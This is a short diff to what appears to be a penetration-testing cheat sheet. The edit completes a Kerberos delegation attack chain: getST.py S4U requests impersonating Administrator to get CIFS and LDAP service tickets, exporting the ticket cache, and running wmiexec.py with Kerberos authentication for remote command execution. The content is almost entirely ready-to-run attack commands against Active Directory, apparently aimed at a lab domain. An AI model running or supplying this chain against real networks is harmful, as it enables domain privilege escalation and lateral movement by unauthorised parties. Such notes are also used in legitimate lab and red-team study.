@@ -322,10 +322,9 @@ Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offe
 ```shell
 getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'domain/username:password'
 getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'domain/username:password' -altservice 'ldap/winterfell'
-# then a kerbros ticket will be cached
+# then a kerbros ticket will be cached, we will export it
 export KRB5CCNAME=/path/to/ticket
-
-wmiexec
+wmiexec.py -k --no-pass domain/user@service
 
 ```
 
